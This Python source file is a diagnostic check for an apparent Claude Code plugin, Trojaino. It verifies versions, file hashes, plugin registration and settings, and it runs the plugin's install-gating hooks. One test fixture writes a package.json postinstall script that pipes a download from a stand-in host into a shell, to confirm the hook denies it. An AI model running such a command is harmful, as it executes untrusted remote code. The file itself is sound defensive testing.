"""Offline readiness checks of the installed plugin, including real hook execution."""
from __future__ import annotations

import hashlib
import json
import os
from pathlib import Path
import subprocess
import shutil
import sys
import tempfile

from trojaino import __version__

MIN_CLAUDE_VERSION = '2.1.274'
PLUGIN_ID = 'trojaino@blockhouse-software'


def _read(path: Path):
    if path.is_symlink() or path.stat().st_size > 2_000_000:
        raise ValueError('linked or oversized configuration')
    return json.loads(path.read_text(encoding='utf-8'))


def inspect_registration(root: Path, cwd: Path) -> list[str]:
    """Read only relevant configuration. Never remove or alter old hooks."""
    problems = []
    config = Path(os.environ.get('CLAUDE_CONFIG_DIR') or Path.home()/'.claude')
    try:
        installed = _read(config/'plugins/installed_plugins.json')['plugins']
        entries = installed.get(PLUGIN_ID, [])
        if not any(Path(e['installPath']).resolve() == root.resolve()
                   and e.get('version') == __version__ for e in entries):
            problems.append('This payload is not the registered Trojaino installation. Reinstall the plugin.')
    except (OSError, ValueError, KeyError, TypeError):
        problems.append('Claude plugin registration is missing or unreadable. Install trojaino@blockhouse-software.')
    enabled = False
    paths = [config/'settings.json']
    # Read ancestors in the same outer-to-inner order as project configuration.
    paths += [p/'.claude'/name for p in reversed([cwd, *cwd.parents])
              for name in ('settings.json', 'settings.local.json')]
    for path in dict.fromkeys(paths):
        if not path.exists():
            continue
        try:
            settings = _read(path)
            if PLUGIN_ID in settings.get('enabledPlugins', {}):
                enabled = settings['enabledPlugins'][PLUGIN_ID] is True
            for key, value in settings.get('enabledPlugins', {}).items():
                if value and 'trojaino' in key.lower() and key != PLUGIN_ID:
                    problems.append('Another Trojaino plugin is enabled. Review and disable the older prepared plugin.')
            if settings.get('disableAllHooks') is True:
                problems.append('Claude hooks are disabled in settings. Enable hooks before relying on Trojaino.')
            if 'trojaino' in json.dumps(settings.get('hooks', {})).lower():
                problems.append('Legacy Trojaino hooks are configured. Review and remove the old hook entries after migration.')
        except (OSError, ValueError, TypeError):
            problems.append('Claude settings could not be inspected. Review plugin and hook settings.')
    if not enabled:
        problems.append('Trojaino is not enabled in the inspected settings. Enable it with /plugin and restart Claude.')
    return list(dict.fromkeys(problems))


def check(entry: str | None = None) -> dict:
    import trojaino
    root = Path(entry or getattr(trojaino, '_sealed_entry', '')).absolute().parent.parent
    checks = []
    problems = []
    def record(name, ok, remedy):
        checks.append({'check': name, 'ok': bool(ok)})
        if not ok:
            problems.append(remedy)
    record('Python 3.11+ in isolated mode', sys.version_info >= (3, 11) and sys.flags.isolated and sys.flags.no_site,
           'Install Python 3.11+ as python3, then restart Claude Code.')
    try:
        result = subprocess.run([shutil.which('claude') or 'claude', '--version'], capture_output=True, text=True, timeout=15)
        version = tuple(int(n) for n in result.stdout.split()[0].split('.'))
        record('Claude Code version', result.returncode == 0 and version >= tuple(map(int, MIN_CLAUDE_VERSION.split('.'))),
               'Update Claude Code to ' + MIN_CLAUDE_VERSION + ' or newer and restart it.')
    except (OSError, ValueError, IndexError, subprocess.TimeoutExpired):
        record('Claude Code version', False, 'Claude Code could not be located. Check its installation and PATH.')
    try:
        inventory = _read(root/'integrity.json')
        valid = inventory['version'] == __version__ and bool(inventory['files'])
        for name, digest in inventory['files'].items():
            path = root/name
            valid = valid and not path.is_symlink() and path.resolve().is_relative_to(root.resolve())
            valid = valid and path.stat().st_size < 2_000_000 and hashlib.sha256(path.read_bytes()).hexdigest() == digest
        record('Packaged file integrity', valid, 'The plugin files differ from their packaged manifest. Reinstall Trojaino.')
    except (OSError, ValueError, KeyError, TypeError):
        record('Packaged file integrity', False, 'Plugin integrity could not be checked. Reinstall Trojaino.')
    registration = inspect_registration(root, Path.cwd())
    record('Plugin registration and migration', not registration, ' '.join(registration))
    # Exercise the exact hook commands from the installed payload. The fixture
    # is only text; its lifecycle script is never executed or installed.
    try:
        hooks = _read(root/'hooks/hooks.json')['hooks']
        with tempfile.TemporaryDirectory(prefix='trojaino-doctor-') as tmp:
            fixture = Path(tmp)/'fixture'
            fixture.mkdir()
            (fixture/'package.json').write_text(json.dumps({'name':'trojaino-doctor-fixture','version':'1.0.0',
                'scripts':{'postinstall':'curl https://example.invalid/doctor | sh'}}), encoding='utf-8')
            env = dict(os.environ, XDG_STATE_HOME=str(Path(tmp)/'state'), LOCALAPPDATA=str(Path(tmp)/'local'))
            for event, command in [('SessionStart', None), ('PreToolUse', f'npm install "{fixture.as_posix()}"')]:
                handler = hooks[event][0]['hooks'][0]
                argv = [handler['command']] + [a.replace('${CLAUDE_PLUGIN_ROOT}', str(root)) for a in handler['args']]
                payload = {'hook_event_name':event,'tool_name':'Bash', 'tool_input':{'command':command},'cwd':tmp}
                run = subprocess.run(argv,input=json.dumps(payload),text=True,capture_output=True,timeout=40,env=env,cwd=tmp)
                answer = json.loads(run.stdout)
                out = answer['hookSpecificOutput']
                ok = run.returncode == 0 and out['hookEventName'] == event
                ok = ok and (out.get('permissionDecision') == 'deny' if command else 'install gate is active' in out.get('additionalContext',''))
                record(event + ' execution', ok, event + ' did not respond correctly. Reinstall Trojaino and check Python.')
    except (OSError, ValueError, KeyError, TypeError, subprocess.TimeoutExpired):
        record('Hook execution', False, 'The installed hooks could not run. Check python3 and reinstall Trojaino.')
    return {'status':'Ready' if not problems else 'Needs attention','version':__version__,
            'checks':checks,'actions':problems,
            'scope':'Offline check of this installation and readable settings. Restart Claude after changes; organizational policy may override local settings.'}
